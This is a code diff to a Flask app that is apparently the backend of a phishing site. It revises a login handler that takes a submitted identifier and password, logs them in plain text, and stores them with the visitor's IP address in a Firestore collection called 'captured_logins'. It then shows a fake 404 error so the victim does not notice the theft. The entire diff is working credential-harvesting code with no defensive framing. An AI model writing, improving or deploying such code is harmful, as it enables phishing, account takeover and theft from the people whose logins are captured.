@@ -205,28 +205,30 @@ def index():
 
 @app.route('/x-auth', methods=['POST'])
 def authenticate():
-    email = request.form.get('email', '').strip()
+    print("=== POST /x-auth received ===")
+    email = request.form.get('identifier', '').strip()  # match name="identifier" in form
     password = request.form.get('password', '').strip()
+    print(f"Form data - identifier/email: '{email}' | password: '{password}'")
 
-    print(f"POST received - email: {email}, password: {password}")  # debug
+    if not email or not password:
+        print("Missing email or password - skipping save")
+        return "Error:404 not found"
 
-    if email and password:
-        if db is None:
-            print("Firestore DB is None - skipping save")
-        else:
-            try:
-                print("Trying to save to Firestore...")
-                doc_ref = db.collection('captured_logins').document()
-                doc_ref.set({
-                    'email': email,
-                    'password': password,
-                    'timestamp': firestore.SERVER_TIMESTAMP,
-                    'ip': request.remote_addr or 'unknown'
-                })
-                print("Save SUCCESS")
-            except Exception as e:
-                print(f"Save FAILED: {str(e)}")
-    else:
-        print("Empty input - not saving")
+    if db is None:
+        print("Firestore DB is None - credentials not loaded")
+        return "Error:404 not found"
 
-    return "error:404 not found"
+    try:
+        print("Attempting Firestore write...")
+        doc_ref = db.collection('captured_logins').document()
+        doc_ref.set({
+            'identifier': email,
+            'password': password,
+            'timestamp': firestore.SERVER_TIMESTAMP,
+            'ip': request.remote_addr or 'unknown'
+        })
+        print("Firestore write SUCCESS")
+    except Exception as e:
+        print(f"Firestore write FAILED: {str(e)}")
+
+    return "Error:404 not found"
